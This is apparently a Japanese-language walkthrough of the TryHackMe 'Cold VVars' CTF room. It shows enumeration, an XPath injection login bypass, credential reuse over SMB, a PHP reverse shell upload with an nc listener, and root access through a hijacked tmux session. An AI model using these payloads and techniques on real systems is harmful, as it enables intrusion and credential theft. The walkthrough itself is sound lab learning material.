# Cold VVars CTF

https://tryhackme.com/room/coldvvars

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.48.178
sudo bash -c "echo $TARGET    coldwars.thm >> /etc/hosts"

root@ip-10-10-98-161:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-12 07:23 BST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 07:23 (0:00:00 remaining)
Nmap scan report for coldwars.thm (10.10.48.178)
Host is up (0.00042s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
8082/tcp open  blackice-alerts
MAC Address: 02:18:E5:1F:DA:45 (Unknown)


root@ip-10-10-98-161:~# sudo nmap -sV -p139,445,8080,8082 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-12 07:23 BST
Nmap scan report for coldwars.thm (10.10.48.178)
Host is up (0.00024s latency).

PORT     STATE SERVICE     VERSION
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8080/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
8082/tcp open  http        Node.js Express framework
MAC Address: 02:18:E5:1F:DA:45 (Unknown)
Service Info: Host: INCOGNITO
```

8080 は apache インストールページ。  
8082 は coldwars の Web ページ。

### サブドメイン

サブドメインなし

```shell
$ ffuf -u http://coldwars.thm:8080 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.coldwars.thm' -fs 10918

$ ffuf -u http://coldwars.thm:8082 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.coldwars.thm' -fs 11162
```

### gobuster

#### 8080

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://coldwars.thm:8080 -w ./dirlist.txt -t 30 -k

===============================================================
/dev                  (Status: 301) [Size: 317] [--> http://coldwars.thm:8080/dev/]
/index.php            (Status: 200) [Size: 4]
===============================================================
```

/index.php, /dev を発見。index.php は「Data」という 4 文字を返すだけ。

#### /dev

```shell
gobuster dir -x=txt,php -u http://coldwars.thm:8080/dev -w ./dirlist.txt -t 30 -k

/note.txt             (Status: 200) [Size: 45]
```

#### /dev/note.txt

```
Secure File Upload and Testing Functionality
```

解釈が難しい。

#### 8082

```shell
root@ip-10-10-98-161:~# gobuster dir -x=txt,php -u http://coldwars.thm:8082 -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1605]
/Login                (Status: 200) [Size: 1605]
/LogIn                (Status: 200) [Size: 1605]
/LOGIN                (Status: 200) [Size: 1605]
/static               (Status: 301) [Size: 179] [--> /static/]
/Static               (Status: 301) [Size: 179] [--> /Static/]
Progress: 681570 / 681573 (100.00%)
===============================================================
```

#### login

ログイン画面。

SQL インジェクションの脆弱性はない。

```shell
sqlmap -r ./req-login.txt --dbs --batch
```

ヒントから、XPATH インジェクションとのこと。

https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html?highlight=xpath#xpath-injection

パスワードに下記設定すると、ユーザー名とパスワードのペアが出てきた。

```
" or "1"="1
```

```
Username Password
Tove [REDACTED]
Godzilla [REDACTED]
SuperMan [REDACTED]
ArthurMorgan [REDACTED]
```

### SMB

```shell
enum4linux -a 10.10.48.178

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        SECURED         Disk      Dev
        IPC$            IPC       IPC Service (incognito server (Samba, Ubuntu))

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1001 Unix User\ArthurMorgan (Local User)
S-1-22-1-1002 Unix User\marston (Local User)

[+] Enumerating users using SID S-1-5-21-4106797096-1993237748-2647641412 and logon username '', password ''

S-1-5-21-4106797096-1993237748-2647641412-501 INCOGNITO\nobody (Local User)
S-1-5-21-4106797096-1993237748-2647641412-513 INCOGNITO\None (Domain Group)
S-1-5-21-4106797096-1993237748-2647641412-1000 INCOGNITO\ArthurMorgan (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
```

SECURED 共有ディレクトリは、8080 ポートの/dev と同じ場所を指している可能性？

## SMB

ログイン画面で表示されたパスワードを使い、SMB にログインできた。

```shell
$ smbclient //10.10.48.178/SECURED -U 'ArthurMorgan'
Password for [WORKGROUP\ArthurMorgan]:
Try "help" to get a list of possible commands.
smb: \>
```

8080 ポートの /dev と同じ場所を指している推測が正しかったと思われる。

```shell
smb: \> ls
  .                                   D        0  Sun Mar 21 19:04:28 2021
  ..                                  D        0  Thu Mar 11 07:52:29 2021
  note.txt                            A       45  Thu Mar 11 07:19:52 2021

                7743660 blocks of size 1024. 4260116 blocks available
```

リバースシェルの PHP をアップロード。

```shell
smb: \> put pentest.php
putting file pentest.php as \pentest.php (3.1 kb/s) (average 3.1 kb/s)
```

リバースシェルゲット。

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.48.178] 41280
Linux incognito 4.15.0-143-generic #147-Ubuntu SMP Wed Apr 14 16:10:11 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:15:59 up  1:56, 20 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
marston  pts/0    tmux(1030).%0    06:20    1:55m  0.03s  0.02s tmux new-session -d
marston  pts/1    tmux(1030).%1    06:20    1:55m  0.03s  0.03s -bash
marston  pts/2    tmux(1030).%2    06:20    1:55m  0.03s  0.03s -bash
marston  pts/3    tmux(1030).%3    06:20    1:55m  0.03s  0.03s -bash
marston  pts/4    tmux(1030).%4    06:20    1:55m  0.03s  0.03s -bash
marston  pts/5    tmux(1030).%5    06:20    1:55m  0.03s  0.03s -bash
marston  pts/6    tmux(1030).%6    06:20    1:55m  0.03s  0.03s -bash
marston  pts/7    tmux(1030).%7    06:20    1:55m  0.03s  0.03s -bash
marston  pts/8    tmux(1030).%8    06:20    1:55m  0.03s  0.03s -bash
marston  pts/9    tmux(1030).%9    06:20    1:55m  0.03s  0.03s -bash
marston  pts/10   tmux(1030).%10   06:20    1:55m  0.03s  0.03s -bash
marston  pts/11   tmux(1030).%11   06:20    1:55m  0.03s  0.00s sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz ssh root@localhost
marston  pts/12   tmux(1030).%12   06:20    1:55m  0.03s  0.03s -bash
marston  pts/13   tmux(1030).%13   06:20    1:55m  0.03s  0.03s -bash
marston  pts/14   tmux(1030).%14   06:20    1:55m  0.04s  0.04s -bash
marston  pts/15   tmux(1030).%15   06:20    1:55m  0.03s  0.03s -bash
marston  pts/16   tmux(1030).%16   06:20    1:55m  0.03s  0.03s -bash
marston  pts/17   tmux(1030).%17   06:20    1:55m  0.03s  0.03s -bash
marston  pts/18   tmux(1030).%18   06:20    1:55m  0.03s  0.03s -bash
root     pts/20   127.0.0.1        06:20    1:55m  0.01s  0.01s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$
```

ユーザーフラグゲット。

```shell
www-data@incognito:/home/ArthurMorgan$ ls -al
total 32
drwxr-xr-x 6 ArthurMorgan ArthurMorgan 4096 May 28  2021 .
drwxr-xr-x 4 root         root         4096 Mar 21  2021 ..
lrwxrwxrwx 1 root         root            9 Mar 23  2021 .bash_history -> /dev/null
drwx------ 2 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .cache
drwxr-x--- 3 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .config
drwx------ 4 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .gnupg
drwxrwxr-x 3 ArthurMorgan ArthurMorgan 4096 Mar 21  2021 .local
-rw-r--r-- 1 ArthurMorgan ArthurMorgan   56 Mar 21  2021 ideas
-rw-r--r-- 1 ArthurMorgan ArthurMorgan   33 Mar 21  2021 user.txt
www-data@incognito:/home/ArthurMorgan$ cat user.txt
ae3...................................
```

## 権限昇格

```shell
www-data@incognito:/home/marston$ ls -al
total 52
drwxr-xr-x 8 marston marston 4096 May 29  2021 .
drwxr-xr-x 4 root    root    4096 Mar 21  2021 ..
lrwxrwxrwx 1 root    root       9 Mar 23  2021 .bash_history -> /dev/null
-rw-r--r-- 1 marston marston 3771 Apr  4  2018 .bashrc
drwx------ 2 marston marston 4096 Mar 22  2021 .cache
drwxr-x--- 3 marston marston 4096 Mar 21  2021 .config
drwx------ 3 marston marston 4096 Mar 22  2021 .gnupg
drwxrwxr-x 3 marston marston 4096 Mar 11  2021 .local
-rw-r--r-- 1 marston marston  807 Apr  4  2018 .profile
drwx------ 2 marston marston 4096 Mar 23  2021 .ssh
drwxr-xr-x 5 marston marston 4096 Mar 22  2021 app
-rw------- 1 marston root    2559 May 29  2021 hicckup.py
-rw-r--r-- 1 root    root       6 Mar 23  2021 ideas
-rwxr-x--- 1 marston root     194 Mar 11  2021 run.sh
```

hicckup.py, run.sh は気になるが、中身は分からない。

su で ArthurMorgan に切り替え可能。（パスワードは Smb と同じ）

env コマンドで、4545 ポートが出てくる。

```
OPEN_PORT=4545
```

listen はしていないように見えるが・・・

```shell
ArthurMorgan@incognito:~$ netstat -nplt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8082            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::139                  :::*                    LISTEN      -
tcp6       0      0 :::8080                 :::*                    LISTEN      -
tcp6       0      0 :::445                  :::*                    LISTEN      -
```

自分で Listen する。

```shell
ArthurMorgan@incognito:~$ nc -l 4545


ideaBox
1.Write
2.Delete
3.Steal others' Trash
4.Show'nExit
```

4 を選んで、:!bash を実行すると marston になる。

```shell
id
uid=1002(marston) gid=1003(marston) groups=1003(marston)
```

```shell
marston@incognito:~$ cat run.sh
#!/bin/bash

echo $(ps -aux|grep "python3 /home/marston/hicckup.py"|wc -l)

if [ $(ps -aux|grep "python3 /home/marston/hicckup.py"|wc -l) -eq 1 ]; then
    python3 /home/marston/hicckup.py &
fi
```

hicckup.py プロセスが消えたら、新しく実行される。run.sh を起動しているのが root だとしたら、hicckup.py をリバースシェルに切り替えたら root シェルを取れる。  
→ 試してみたが、marston が実行していたので意味なかった。

### tmux

```shell
marston@incognito:~$ tmux ls
0: 9 windows (created Mon May 12 06:20:19 2025) [80x24]

marston@incognito:~$ tmux a -t 0
```

順番に見ていくと、6 番 Window に root シェルがあった。

```shell
root@incognito:~# id                                                                                                  │marston@incognito:~$
uid=0(root) gid=0(root) groups=0(root)                                                                                │
root@incognito:~# ls /root                                                                                            │
root.txt                                                                                                              │
root@incognito:~# cat /root/root.txt                                                                                  │
42...................................
```

## 振り返り

- まず XPATH インジェクションがなかなか思いつきづらく、難関。
- 4545 ポートの発見も難しい。Listen していなければ自分で Listen してみるというパターンは初見。
- ps コマンド実行時、tmux プロセスがあるのには気づいていたが、こういう形で利用するのも初見で、そこを目標にする発想が無かった。
- 最初にリバースシェルを取得したとき、こういう表示があった。気にはなっていたが、理解していなかったので、次からはすぐに気づけるようにしたい。

```shell
marston  pts/9    tmux(1030).%9    06:20    1:55m  0.03s  0.03s -bash
marston  pts/10   tmux(1030).%10   06:20    1:55m  0.03s  0.03s -bash
marston  pts/11   tmux(1030).%11   06:20    1:55m  0.03s  0.00s sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz ssh root@localhost
marston  pts/12   tmux(1030).%12   06:20    1:55m  0.03s  0.03s -bash
marston  pts/13   tmux(1030).%13   06:20    1:55m  0.03s  0.03s -bash
marston  pts/14   tmux(1030).%14   06:20    1:55m  0.04s  0.04s -bash
```
